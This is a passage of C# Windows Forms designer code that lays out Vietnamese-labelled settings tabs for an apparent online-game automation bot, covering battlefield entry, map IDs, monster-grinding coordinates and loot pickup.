		this.comboBoxChienTruong.ForeColor = System.Drawing.Color.Black;
		this.comboBoxChienTruong.FormattingEnabled = true;
		this.comboBoxChienTruong.Location = new System.Drawing.Point(113, 1);
		this.comboBoxChienTruong.Name = "comboBoxChienTruong";
		this.comboBoxChienTruong.Size = new System.Drawing.Size(129, 23);
		this.comboBoxChienTruong.TabIndex = 182;
		this.comboBoxChienTruong.SelectedIndexChanged += new System.EventHandler(comboBoxChienTruong_SelectedIndexChanged);
		this.checkBoxMapPhu.AutoSize = true;
		this.checkBoxMapPhu.ForeColor = System.Drawing.Color.Black;
		this.checkBoxMapPhu.Location = new System.Drawing.Point(3, 141);
		this.checkBoxMapPhu.Name = "checkBoxMapPhu";
		this.checkBoxMapPhu.Size = new System.Drawing.Size(201, 19);
		this.checkBoxMapPhu.TabIndex = 231;
		this.checkBoxMapPhu.Text = "Vào map phụ khi map chính đầy";
		this.checkBoxMapPhu.UseVisualStyleBackColor = true;
		this.checkBoxMapPhu.CheckedChanged += new System.EventHandler(checkBoxMapPhu_CheckedChanged);
		this.checkBoxTHPCTC.AutoSize = true;
		this.checkBoxTHPCTC.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxTHPCTC.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTHPCTC.Location = new System.Drawing.Point(2, 78);
		this.checkBoxTHPCTC.Name = "checkBoxTHPCTC";
		this.checkBoxTHPCTC.Size = new System.Drawing.Size(198, 17);
		this.checkBoxTHPCTC.TabIndex = 230;
		this.checkBoxTHPCTC.Text = "Dùng THP để vào, click menu dòng";
		this.checkBoxTHPCTC.UseVisualStyleBackColor = true;
		this.checkBoxTHPCTC.CheckedChanged += new System.EventHandler(checkBoxTHPCTC_CheckedChanged);
		this.tabPageTamtru.Controls.Add(this.groupBox8);
		this.tabPageTamtru.Controls.Add(this.checkBoxPheThu);
		this.tabPageTamtru.Controls.Add(this.buttonPhimHdTamtru);
		this.tabPageTamtru.Location = new System.Drawing.Point(4, 24);
		this.tabPageTamtru.Name = "tabPageTamtru";
		this.tabPageTamtru.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageTamtru.Size = new System.Drawing.Size(246, 225);
		this.tabPageTamtru.TabIndex = 1;
		this.tabPageTamtru.Text = "Tam trụ";
		this.tabPageTamtru.UseVisualStyleBackColor = true;
		this.groupBox8.Controls.Add(this.buttonLayvitriCongTamtru);
		this.groupBox8.Controls.Add(this.textBoxCongTamtru);
		this.groupBox8.Controls.Add(this.label30);
		this.groupBox8.Controls.Add(this.textBoxToadoHieuthuocTamtru);
		this.groupBox8.Controls.Add(this.label28);
		this.groupBox8.Controls.Add(this.comboBoxTenHieuThuocTamtru);
		this.groupBox8.Location = new System.Drawing.Point(1, 29);
		this.groupBox8.Name = "groupBox8";
		this.groupBox8.Size = new System.Drawing.Size(245, 134);
		this.groupBox8.TabIndex = 234;
		this.groupBox8.TabStop = false;
		this.groupBox8.Text = "Thiết lập";
		this.buttonLayvitriCongTamtru.Location = new System.Drawing.Point(117, 97);
		this.buttonLayvitriCongTamtru.Name = "buttonLayvitriCongTamtru";
		this.buttonLayvitriCongTamtru.Size = new System.Drawing.Size(65, 21);
		this.buttonLayvitriCongTamtru.TabIndex = 231;
		this.buttonLayvitriCongTamtru.Text = "Lấy vị trí";
		this.buttonLayvitriCongTamtru.UseVisualStyleBackColor = true;
		this.buttonLayvitriCongTamtru.Click += new System.EventHandler(buttonLayvitriCongTamtru_Click);
		this.textBoxCongTamtru.ForeColor = System.Drawing.Color.Black;
		this.textBoxCongTamtru.Location = new System.Drawing.Point(13, 98);
		this.textBoxCongTamtru.Name = "textBoxCongTamtru";
		this.textBoxCongTamtru.ReadOnly = true;
		this.textBoxCongTamtru.Size = new System.Drawing.Size(97, 21);
		this.textBoxCongTamtru.TabIndex = 230;
		this.label30.AutoSize = true;
		this.label30.ForeColor = System.Drawing.Color.Black;
		this.label30.Location = new System.Drawing.Point(7, 78);
		this.label30.Name = "label30";
		this.label30.Size = new System.Drawing.Size(195, 15);
		this.label30.TabIndex = 228;
		this.label30.Text = "Vị trí Cổng chạy ra ngoài chiến đấu";
		this.textBoxToadoHieuthuocTamtru.ForeColor = System.Drawing.Color.Black;
		this.textBoxToadoHieuthuocTamtru.Location = new System.Drawing.Point(13, 48);
		this.textBoxToadoHieuthuocTamtru.Name = "textBoxToadoHieuthuocTamtru";
		this.textBoxToadoHieuthuocTamtru.ReadOnly = true;
		this.textBoxToadoHieuthuocTamtru.Size = new System.Drawing.Size(97, 21);
		this.textBoxToadoHieuthuocTamtru.TabIndex = 227;
		this.label28.AutoSize = true;
		this.label28.ForeColor = System.Drawing.Color.Black;
		this.label28.Location = new System.Drawing.Point(7, 31);
		this.label28.Name = "label28";
		this.label28.Size = new System.Drawing.Size(245, 15);
		this.label28.TabIndex = 225;
		this.label28.Text = "Tên Hiệu thuốc (đem ac đến gần rồi lấy tên)";
		this.comboBoxTenHieuThuocTamtru.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxTenHieuThuocTamtru.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTenHieuThuocTamtru.FormattingEnabled = true;
		this.comboBoxTenHieuThuocTamtru.Location = new System.Drawing.Point(116, 47);
		this.comboBoxTenHieuThuocTamtru.Name = "comboBoxTenHieuThuocTamtru";
		this.comboBoxTenHieuThuocTamtru.Size = new System.Drawing.Size(118, 23);
		this.comboBoxTenHieuThuocTamtru.TabIndex = 223;
		this.comboBoxTenHieuThuocTamtru.SelectedIndexChanged += new System.EventHandler(comboBoxTenHieuThuocTamtru_SelectedIndexChanged);
		this.comboBoxTenHieuThuocTamtru.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxTenHieuThuocTamtru_MouseDown);
		this.checkBoxPheThu.AutoSize = true;
		this.checkBoxPheThu.ForeColor = System.Drawing.Color.Red;
		this.checkBoxPheThu.Location = new System.Drawing.Point(1, 4);
		this.checkBoxPheThu.Name = "checkBoxPheThu";
		this.checkBoxPheThu.Size = new System.Drawing.Size(110, 19);
		this.checkBoxPheThu.TabIndex = 235;
		this.checkBoxPheThu.Text = "Đang ở phe thủ";
		this.checkBoxPheThu.UseVisualStyleBackColor = true;
		this.checkBoxPheThu.CheckedChanged += new System.EventHandler(checkBoxPheThu_CheckedChanged);
		this.buttonPhimHdTamtru.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonPhimHdTamtru.Location = new System.Drawing.Point(11, 169);
		this.buttonPhimHdTamtru.Name = "buttonPhimHdTamtru";
		this.buttonPhimHdTamtru.Size = new System.Drawing.Size(216, 41);
		this.buttonPhimHdTamtru.TabIndex = 233;
		this.buttonPhimHdTamtru.Text = "Phim Hướng dẫn";
		this.buttonPhimHdTamtru.UseVisualStyleBackColor = true;
		this.buttonPhimHdTamtru.Click += new System.EventHandler(buttonPhimHdTamtru_Click);
		this.tabPageTamMondai.Controls.Add(this.buttonTamMonDaiHD);
		this.tabPageTamMondai.Controls.Add(this.richTextBox2);
		this.tabPageTamMondai.Controls.Add(this.buttonMapTamMondaiMacdinh);
		this.tabPageTamMondai.Controls.Add(this.label27);
		this.tabPageTamMondai.Controls.Add(this.buttonLayMapTamMondai);
		this.tabPageTamMondai.Controls.Add(this.textBoxTamMonDaiMapId);
		this.tabPageTamMondai.Location = new System.Drawing.Point(4, 24);
		this.tabPageTamMondai.Name = "tabPageTamMondai";
		this.tabPageTamMondai.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageTamMondai.Size = new System.Drawing.Size(246, 225);
		this.tabPageTamMondai.TabIndex = 2;
		this.tabPageTamMondai.Text = "Tam môn đài";
		this.tabPageTamMondai.UseVisualStyleBackColor = true;
		this.buttonTamMonDaiHD.Location = new System.Drawing.Point(109, 192);
		this.buttonTamMonDaiHD.Name = "buttonTamMonDaiHD";
		this.buttonTamMonDaiHD.Size = new System.Drawing.Size(133, 26);
		this.buttonTamMonDaiHD.TabIndex = 6;
		this.buttonTamMonDaiHD.Text = "Phim Hướng dẫn";
		this.buttonTamMonDaiHD.UseVisualStyleBackColor = true;
		this.buttonTamMonDaiHD.Click += new System.EventHandler(buttonTamMonDaiHD_Click);
		this.richTextBox2.BackColor = System.Drawing.Color.White;
		this.richTextBox2.ForeColor = System.Drawing.Color.Black;
		this.richTextBox2.Location = new System.Drawing.Point(1, 1);
		this.richTextBox2.Name = "richTextBox2";
		this.richTextBox2.ReadOnly = true;
		this.richTextBox2.Size = new System.Drawing.Size(246, 125);
		this.richTextBox2.TabIndex = 5;
		this.richTextBox2.Text = "";
		this.buttonMapTamMondaiMacdinh.Location = new System.Drawing.Point(109, 161);
		this.buttonMapTamMondaiMacdinh.Name = "buttonMapTamMondaiMacdinh";
		this.buttonMapTamMondaiMacdinh.Size = new System.Drawing.Size(133, 26);
		this.buttonMapTamMondaiMacdinh.TabIndex = 4;
		this.buttonMapTamMondaiMacdinh.Text = "Lấy mapID mặc định";
		this.buttonMapTamMondaiMacdinh.UseVisualStyleBackColor = true;
		this.buttonMapTamMondaiMacdinh.Click += new System.EventHandler(buttonMapTamMondaiMacdinh_Click);
		this.label27.AutoSize = true;
		this.label27.ForeColor = System.Drawing.Color.Red;
		this.label27.Location = new System.Drawing.Point(4, 132);
		this.label27.Name = "label27";
		this.label27.Size = new System.Drawing.Size(102, 15);
		this.label27.TabIndex = 3;
		this.label27.Text = "MapID hoạt động";
		this.buttonLayMapTamMondai.ForeColor = System.Drawing.Color.MidnightBlue;
		this.buttonLayMapTamMondai.Location = new System.Drawing.Point(109, 132);
		this.buttonLayMapTamMondai.Name = "buttonLayMapTamMondai";
		this.buttonLayMapTamMondai.Size = new System.Drawing.Size(133, 26);
		this.buttonLayMapTamMondai.TabIndex = 2;
		this.buttonLayMapTamMondai.Text = "Lấy mapID đang đứng";
		this.buttonLayMapTamMondai.UseVisualStyleBackColor = true;
		this.buttonLayMapTamMondai.Click += new System.EventHandler(buttonLayMapTamMondai_Click);
		this.textBoxTamMonDaiMapId.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxTamMonDaiMapId.Location = new System.Drawing.Point(14, 150);
		this.textBoxTamMonDaiMapId.Name = "textBoxTamMonDaiMapId";
		this.textBoxTamMonDaiMapId.ReadOnly = true;
		this.textBoxTamMonDaiMapId.Size = new System.Drawing.Size(35, 21);
		this.textBoxTamMonDaiMapId.TabIndex = 1;
		this.textBoxTamMonDaiMapId.Text = "221";
		this.textBoxTamMonDaiMapId.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.checkBoxAccChinhTudieukhienCTC.ForeColor = System.Drawing.Color.Red;
		this.checkBoxAccChinhTudieukhienCTC.Location = new System.Drawing.Point(3, 8);
		this.checkBoxAccChinhTudieukhienCTC.Name = "checkBoxAccChinhTudieukhienCTC";
		this.checkBoxAccChinhTudieukhienCTC.Size = new System.Drawing.Size(126, 39);
		this.checkBoxAccChinhTudieukhienCTC.TabIndex = 232;
		this.checkBoxAccChinhTudieukhienCTC.Text = "Ac chính người dùng tự điều khiển hậu cần";
		this.checkBoxAccChinhTudieukhienCTC.UseVisualStyleBackColor = true;
		this.checkBoxAccChinhTudieukhienCTC.CheckedChanged += new System.EventHandler(checkBoxAccChinhTudieukhienCTC_CheckedChanged);
		this.tabPageTrain.Controls.Add(this.tabControl6);
		this.tabPageTrain.Location = new System.Drawing.Point(4, 24);
		this.tabPageTrain.Name = "tabPageTrain";
		this.tabPageTrain.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageTrain.Size = new System.Drawing.Size(390, 263);
		this.tabPageTrain.TabIndex = 5;
		this.tabPageTrain.Text = "Train Quái";
		this.tabPageTrain.UseVisualStyleBackColor = true;
		this.tabControl6.Controls.Add(this.tabPage16);
		this.tabControl6.Controls.Add(this.tabPage18);
		this.tabControl6.Location = new System.Drawing.Point(-4, 3);
		this.tabControl6.Margin = new System.Windows.Forms.Padding(0);
		this.tabControl6.Name = "tabControl6";
		this.tabControl6.SelectedIndex = 0;
		this.tabControl6.Size = new System.Drawing.Size(395, 267);
		this.tabControl6.TabIndex = 0;
		this.tabPage16.Controls.Add(this.buttonCopyPosXY);
		this.tabPage16.Controls.Add(this.buttonHuongDan);
		this.tabPage16.Controls.Add(this.buttonApdungAllTrain);
		this.tabPage16.Controls.Add(this.linkLabelPhimPhichiendau);
		this.tabPage16.Controls.Add(this.textBoxSLThoat);
		this.tabPage16.Controls.Add(this.checkBoxToadoVong);
		this.tabPage16.Controls.Add(this.linkLabelPhimChaynhim);
		this.tabPage16.Controls.Add(this.checkBoxDanhQuaiTrenduongdi);
		this.tabPage16.Controls.Add(this.textBoxMapName);
		this.tabPage16.Controls.Add(this.checkBoxTrain);
		this.tabPage16.Controls.Add(this.checkBoxTDPHettien);
		this.tabPage16.Controls.Add(this.checkBoxDanhquaiTrain);
		this.tabPage16.Controls.Add(this.checkBoxTucheHT);
		this.tabPage16.Controls.Add(this.checkBoxTranhBossVang);
		this.tabPage16.Controls.Add(this.listViewTrain);
		this.tabPage16.Controls.Add(this.comboBoxOtrong);
		this.tabPage16.Controls.Add(this.checkBoxOtrong);
		this.tabPage16.Controls.Add(this.buttonDoctep);
		this.tabPage16.Controls.Add(this.buttonLayToadoTrain);
		this.tabPage16.Controls.Add(this.checkBoxLuomrac);
		this.tabPage16.Controls.Add(this.buttonXoaToadoTrain);
		this.tabPage16.Controls.Add(this.checkBoxTDPSaimap);
		this.tabPage16.Controls.Add(this.buttonLuutep);
		this.tabPage16.Controls.Add(this.checkBoxSLThoat);
		this.tabPage16.Location = new System.Drawing.Point(4, 24);
		this.tabPage16.Name = "tabPage16";
		this.tabPage16.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage16.Size = new System.Drawing.Size(387, 239);
		this.tabPage16.TabIndex = 0;
		this.tabPage16.Text = "Thiết lập 1";
		this.tabPage16.UseVisualStyleBackColor = true;
		this.buttonCopyPosXY.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonCopyPosXY.Location = new System.Drawing.Point(342, 5);
		this.buttonCopyPosXY.Name = "buttonCopyPosXY";
		this.buttonCopyPosXY.Size = new System.Drawing.Size(40, 21);
		this.buttonCopyPosXY.TabIndex = 269;
		this.buttonCopyPosXY.Text = "Copy";
		this.buttonCopyPosXY.UseVisualStyleBackColor = true;
		this.buttonCopyPosXY.Click += new System.EventHandler(buttonCopyPosXY_Click);
		this.buttonHuongDan.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonHuongDan.Location = new System.Drawing.Point(3, 165);
		this.buttonHuongDan.Name = "buttonHuongDan";
		this.buttonHuongDan.Size = new System.Drawing.Size(122, 50);
		this.buttonHuongDan.TabIndex = 252;
		this.buttonHuongDan.Text = "Hướng dẫn";
		this.buttonHuongDan.UseVisualStyleBackColor = true;
		this.buttonHuongDan.Click += new System.EventHandler(buttonHuongDan_Click);
		this.buttonApdungAllTrain.ForeColor = System.Drawing.Color.Red;
		this.buttonApdungAllTrain.Location = new System.Drawing.Point(3, 142);
		this.buttonApdungAllTrain.Name = "buttonApdungAllTrain";
		this.buttonApdungAllTrain.Size = new System.Drawing.Size(122, 23);
		this.buttonApdungAllTrain.TabIndex = 238;
		this.buttonApdungAllTrain.Text = "Áp dụng tất cả ac";
		this.buttonApdungAllTrain.UseVisualStyleBackColor = true;
		this.buttonApdungAllTrain.Click += new System.EventHandler(buttonApdungAllTrain_Click);
		this.linkLabelPhimPhichiendau.Location = new System.Drawing.Point(128, 172);
		this.linkLabelPhimPhichiendau.Name = "linkLabelPhimPhichiendau";
		this.linkLabelPhimPhichiendau.Size = new System.Drawing.Size(101, 41);
		this.linkLabelPhimPhichiendau.TabIndex = 268;
		this.linkLabelPhimPhichiendau.TabStop = true;
		this.linkLabelPhimPhichiendau.Text = "Xem phim thấy hay, xin 1 like và 1 Sub nha ae";
		this.linkLabelPhimPhichiendau.Visible = false;
		this.linkLabelPhimPhichiendau.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelPhimPhichiendau_LinkClicked);
		this.textBoxSLThoat.Location = new System.Drawing.Point(206, 74);
		this.textBoxSLThoat.Name = "textBoxSLThoat";
		this.textBoxSLThoat.Size = new System.Drawing.Size(40, 21);
		this.textBoxSLThoat.TabIndex = 247;
		this.textBoxSLThoat.TextChanged += new System.EventHandler(textBoxSLThoat_TextChanged);
		this.checkBoxToadoVong.AutoSize = true;
		this.checkBoxToadoVong.ForeColor = System.Drawing.Color.Black;
		this.checkBoxToadoVong.Location = new System.Drawing.Point(127, 31);
		this.checkBoxToadoVong.Name = "checkBoxToadoVong";
		this.checkBoxToadoVong.Size = new System.Drawing.Size(117, 19);
		this.checkBoxToadoVong.TabIndex = 265;
		this.checkBoxToadoVong.Text = "Tọa độ vòng tròn";
		this.checkBoxToadoVong.UseVisualStyleBackColor = true;
		this.checkBoxToadoVong.CheckedChanged += new System.EventHandler(checkBoxToadoVong_CheckedChanged);
		this.linkLabelPhimChaynhim.Location = new System.Drawing.Point(2, 172);
		this.linkLabelPhimChaynhim.Name = "linkLabelPhimChaynhim";
		this.linkLabelPhimChaynhim.Size = new System.Drawing.Size(134, 49);
		this.linkLabelPhimChaynhim.TabIndex = 266;
		this.linkLabelPhimChaynhim.TabStop = true;
		this.linkLabelPhimChaynhim.Text = "Nếu tranin ở đây, thì chỉ cần lấy tọa độ mỗi acc chính, ko áp dụng tất cả";
		this.linkLabelPhimChaynhim.Visible = false;
		this.linkLabelPhimChaynhim.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelPhimChaynhim_LinkClicked);
		this.checkBoxDanhQuaiTrenduongdi.AutoSize = true;
		this.checkBoxDanhQuaiTrenduongdi.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxDanhQuaiTrenduongdi.ForeColor = System.Drawing.Color.Black;
		this.checkBoxDanhQuaiTrenduongdi.Location = new System.Drawing.Point(127, 55);
		this.checkBoxDanhQuaiTrenduongdi.Name = "checkBoxDanhQuaiTrenduongdi";
		this.checkBoxDanhQuaiTrenduongdi.Size = new System.Drawing.Size(119, 17);
		this.checkBoxDanhQuaiTrenduongdi.TabIndex = 267;
		this.checkBoxDanhQuaiTrenduongdi.Text = "Đánh trên đường đi";
		this.checkBoxDanhQuaiTrenduongdi.UseVisualStyleBackColor = true;
		this.checkBoxDanhQuaiTrenduongdi.CheckedChanged += new System.EventHandler(checkBoxDanhQuaiTrenduongdi_CheckedChanged);
		this.textBoxMapName.BackColor = System.Drawing.SystemColors.Control;
		this.textBoxMapName.ForeColor = System.Drawing.Color.Black;
		this.textBoxMapName.Location = new System.Drawing.Point(127, 6);
		this.textBoxMapName.Name = "textBoxMapName";
		this.textBoxMapName.ReadOnly = true;
		this.textBoxMapName.Size = new System.Drawing.Size(116, 21);
		this.textBoxMapName.TabIndex = 173;
		this.checkBoxTrain.AutoSize = true;
		this.checkBoxTrain.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxTrain.ForeColor = System.Drawing.Color.Red;
		this.checkBoxTrain.Location = new System.Drawing.Point(4, 8);
		this.checkBoxTrain.Name = "checkBoxTrain";
		this.checkBoxTrain.Size = new System.Drawing.Size(130, 17);
		this.checkBoxTrain.TabIndex = 223;
		this.checkBoxTrain.Text = "Train hiển thị maps =>";
		this.checkBoxTrain.UseVisualStyleBackColor = true;
		this.checkBoxTrain.CheckedChanged += new System.EventHandler(checkBoxTrain_CheckedChanged);
		this.checkBoxTDPHettien.AutoSize = true;
		this.checkBoxTDPHettien.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTDPHettien.Location = new System.Drawing.Point(4, 121);
		this.checkBoxTDPHettien.Name = "checkBoxTDPHettien";
		this.checkBoxTDPHettien.Size = new System.Drawing.Size(112, 19);
		this.checkBoxTDPHettien.TabIndex = 264;
		this.checkBoxTDPHettien.Text = "TĐP khi hết tiền";
		this.checkBoxTDPHettien.UseVisualStyleBackColor = true;
		this.checkBoxTDPHettien.CheckedChanged += new System.EventHandler(checkBoxTDPHettien_CheckedChanged);
		this.checkBoxDanhquaiTrain.AutoSize = true;
		this.checkBoxDanhquaiTrain.ForeColor = System.Drawing.Color.Black;
		this.checkBoxDanhquaiTrain.Location = new System.Drawing.Point(4, 31);
		this.checkBoxDanhquaiTrain.Name = "checkBoxDanhquaiTrain";
		this.checkBoxDanhquaiTrain.Size = new System.Drawing.Size(118, 19);
		this.checkBoxDanhquaiTrain.TabIndex = 263;
		this.checkBoxDanhquaiTrain.Text = "Đánh quái (train)";
		this.checkBoxDanhquaiTrain.UseVisualStyleBackColor = true;
		this.checkBoxDanhquaiTrain.CheckedChanged += new System.EventHandler(checkBoxDanhquaiTrain_CheckedChanged);
		this.checkBoxTucheHT.AutoSize = true;
		this.checkBoxTucheHT.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxTucheHT.ForeColor = System.Drawing.Color.DarkBlue;
		this.checkBoxTucheHT.Location = new System.Drawing.Point(127, 121);
		this.checkBoxTucheHT.Name = "checkBoxTucheHT";
		this.checkBoxTucheHT.Size = new System.Drawing.Size(117, 17);
		this.checkBoxTucheHT.TabIndex = 262;
		this.checkBoxTucheHT.Text = "Chế tạo Huyền tinh";
		this.checkBoxTucheHT.UseVisualStyleBackColor = true;
		this.checkBoxTucheHT.CheckedChanged += new System.EventHandler(checkBoxTucheHT_CheckedChanged);
		this.checkBoxTranhBossVang.AutoSize = true;
		this.checkBoxTranhBossVang.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTranhBossVang.Location = new System.Drawing.Point(4, 54);
		this.checkBoxTranhBossVang.Name = "checkBoxTranhBossVang";
		this.checkBoxTranhBossVang.Size = new System.Drawing.Size(116, 19);
		this.checkBoxTranhBossVang.TabIndex = 239;
		this.checkBoxTranhBossVang.Text = "Tránh boss vàng";
		this.checkBoxTranhBossVang.UseVisualStyleBackColor = true;
		this.checkBoxTranhBossVang.CheckedChanged += new System.EventHandler(checkBoxTranhBossVang_CheckedChanged);
		this.listViewTrain.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.listViewTrain.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader_3, this.columnHeader_4 });
		this.listViewTrain.FullRowSelect = true;
		this.listViewTrain.GridLines = true;
		this.listViewTrain.HideSelection = false;
		this.listViewTrain.Location = new System.Drawing.Point(250, 31);
		this.listViewTrain.MultiSelect = false;
		this.listViewTrain.Name = "listViewTrain";
		this.listViewTrain.Size = new System.Drawing.Size(131, 106);
		this.listViewTrain.TabIndex = 220;
		this.listViewTrain.UseCompatibleStateImageBehavior = false;
		this.listViewTrain.View = System.Windows.Forms.View.Details;
		this.listViewTrain.SelectedIndexChanged += new System.EventHandler(listViewTrain_SelectedIndexChanged);
		this.listViewTrain.MouseDown += new System.Windows.Forms.MouseEventHandler(listViewTrain_MouseDown);
		this.columnHeader_3.Text = "N";
		this.columnHeader_3.Width = 20;
		this.columnHeader_4.Text = "Tọa độ";
		this.columnHeader_4.Width = 70;
		this.comboBoxOtrong.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxOtrong.FormattingEnabled = true;
		this.comboBoxOtrong.Location = new System.Drawing.Point(127, 96);
		this.comboBoxOtrong.Name = "comboBoxOtrong";
		this.comboBoxOtrong.Size = new System.Drawing.Size(57, 23);
		this.comboBoxOtrong.TabIndex = 250;
		this.comboBoxOtrong.SelectedIndexChanged += new System.EventHandler(comboBoxOtrong_SelectedIndexChanged);
		this.checkBoxOtrong.AutoSize = true;
		this.checkBoxOtrong.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxOtrong.ForeColor = System.Drawing.Color.Black;
		this.checkBoxOtrong.Location = new System.Drawing.Point(4, 98);
		this.checkBoxOtrong.Name = "checkBoxOtrong";
		this.checkBoxOtrong.Size = new System.Drawing.Size(124, 17);
		this.checkBoxOtrong.TabIndex = 249;
		this.checkBoxOtrong.Text = "TĐP khi ô trong túi <";
		this.checkBoxOtrong.UseVisualStyleBackColor = true;
		this.checkBoxOtrong.CheckedChanged += new System.EventHandler(checkBoxOtrong_CheckedChanged);
		this.buttonDoctep.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.buttonDoctep.Location = new System.Drawing.Point(249, 5);
		this.buttonDoctep.Name = "buttonDoctep";
		this.buttonDoctep.Size = new System.Drawing.Size(44, 21);
		this.buttonDoctep.TabIndex = 226;
		this.buttonDoctep.Text = "Nhập";
		this.buttonDoctep.UseVisualStyleBackColor = true;
		this.buttonDoctep.Click += new System.EventHandler(buttonDoctep_Click);
		this.buttonLayToadoTrain.ForeColor = System.Drawing.Color.Black;
		this.buttonLayToadoTrain.Location = new System.Drawing.Point(249, 143);
		this.buttonLayToadoTrain.Name = "buttonLayToadoTrain";
		this.buttonLayToadoTrain.Size = new System.Drawing.Size(82, 23);
		this.buttonLayToadoTrain.TabIndex = 224;
		this.buttonLayToadoTrain.Text = "Lấy tọa độ";
		this.buttonLayToadoTrain.UseVisualStyleBackColor = true;
		this.buttonLayToadoTrain.Click += new System.EventHandler(buttonLayToadoTrain_Click);
		this.checkBoxLuomrac.ForeColor = System.Drawing.Color.DarkBlue;
		this.checkBoxLuomrac.Location = new System.Drawing.Point(127, 142);
		this.checkBoxLuomrac.Name = "checkBoxLuomrac";
		this.checkBoxLuomrac.Size = new System.Drawing.Size(100, 27);
		this.checkBoxLuomrac.TabIndex = 245;
		this.checkBoxLuomrac.Text = "Lượm rác";
		this.checkBoxLuomrac.UseVisualStyleBackColor = true;
		this.checkBoxLuomrac.CheckedChanged += new System.EventHandler(checkBoxLuomrac_CheckedChanged);
		this.buttonXoaToadoTrain.Location = new System.Drawing.Point(337, 143);
		this.buttonXoaToadoTrain.Name = "buttonXoaToadoTrain";
		this.buttonXoaToadoTrain.Size = new System.Drawing.Size(44, 23);
		this.buttonXoaToadoTrain.TabIndex = 225;
		this.buttonXoaToadoTrain.Text = "Xóa";
		this.buttonXoaToadoTrain.UseVisualStyleBackColor = true;
		this.buttonXoaToadoTrain.Click += new System.EventHandler(buttonXoaToadoTrain_Click);
		this.checkBoxTDPSaimap.AutoSize = true;
		this.checkBoxTDPSaimap.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTDPSaimap.Location = new System.Drawing.Point(4, 76);
		this.checkBoxTDPSaimap.Name = "checkBoxTDPSaimap";
		this.checkBoxTDPSaimap.Size = new System.Drawing.Size(116, 19);
		this.checkBoxTDPSaimap.TabIndex = 240;
		this.checkBoxTDPSaimap.Text = "TĐP khi sai map";
		this.checkBoxTDPSaimap.UseVisualStyleBackColor = true;
		this.checkBoxTDPSaimap.CheckedChanged += new System.EventHandler(checkBoxTDPSaimap_CheckedChanged);
		this.buttonLuutep.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.buttonLuutep.Location = new System.Drawing.Point(298, 5);
		this.buttonLuutep.Name = "buttonLuutep";
		this.buttonLuutep.Size = new System.Drawing.Size(40, 21);
		this.buttonLuutep.TabIndex = 227;
		this.buttonLuutep.Text = "Save";
		this.buttonLuutep.UseVisualStyleBackColor = true;
		this.buttonLuutep.Click += new System.EventHandler(buttonLuutep_Click);
		this.checkBoxSLThoat.AutoSize = true;
		this.checkBoxSLThoat.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxSLThoat.ForeColor = System.Drawing.Color.Black;
		this.checkBoxSLThoat.Location = new System.Drawing.Point(127, 76);
		this.checkBoxSLThoat.Name = "checkBoxSLThoat";
		this.checkBoxSLThoat.Size = new System.Drawing.Size(86, 17);
		this.checkBoxSLThoat.TabIndex = 246;
		this.checkBoxSLThoat.Text = "S.lực thoát <";
		this.checkBoxSLThoat.UseVisualStyleBackColor = true;
		this.checkBoxSLThoat.CheckedChanged += new System.EventHandler(checkBoxSLThoat_CheckedChanged);
		this.tabPage18.Controls.Add(this.baodskenhbang);
		this.tabPage18.Controls.Add(this.timequaylai);
		this.tabPage18.Controls.Add(this.checkBoxQuayquai);
		this.tabPage18.Controls.Add(this.buttonThuocLag);
		this.tabPage18.Controls.Add(this.checkBoxAnThuocLag);
		this.tabPage18.Controls.Add(this.labelLocBando);
		this.tabPage18.Controls.Add(this.comboBoxDoSatcuuSat);
		this.tabPage18.Controls.Add(this.label24);
		this.tabPage18.Controls.Add(this.textBoxPhamviNhat);
		this.tabPage18.Controls.Add(this.checkBoxNhatdoDichuyenGan);
		this.tabPage18.Controls.Add(this.textBoxTimeXepdo);
		this.tabPage18.Controls.Add(this.checkBoxXepdo);
		this.tabPage18.Controls.Add(this.label18);
		this.tabPage18.Controls.Add(this.buttonKhongcat);
		this.tabPage18.Controls.Add(this.checkBoxRuong0);
		this.tabPage18.Controls.Add(this.checkBoxRuong2);
		this.tabPage18.Controls.Add(this.checkBoxRuong3);
		this.tabPage18.Controls.Add(this.checkBoxRuong1);
		this.tabPage18.Controls.Add(this.label42);
		this.tabPage18.Location = new System.Drawing.Point(4, 24);
		this.tabPage18.Name = "tabPage18";
		this.tabPage18.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage18.Size = new System.Drawing.Size(387, 239);
		this.tabPage18.TabIndex = 1;
		this.tabPage18.Text = "Thiết lập 2";
		this.tabPage18.UseVisualStyleBackColor = true;
		this.baodskenhbang.AutoSize = true;
		this.baodskenhbang.Location = new System.Drawing.Point(9, 31);
		this.baodskenhbang.Name = "baodskenhbang";
		this.baodskenhbang.Size = new System.Drawing.Size(132, 19);
		this.baodskenhbang.TabIndex = 340;
		this.baodskenhbang.Text = "Báo DS Kênh Bang";
		this.baodskenhbang.UseVisualStyleBackColor = true;
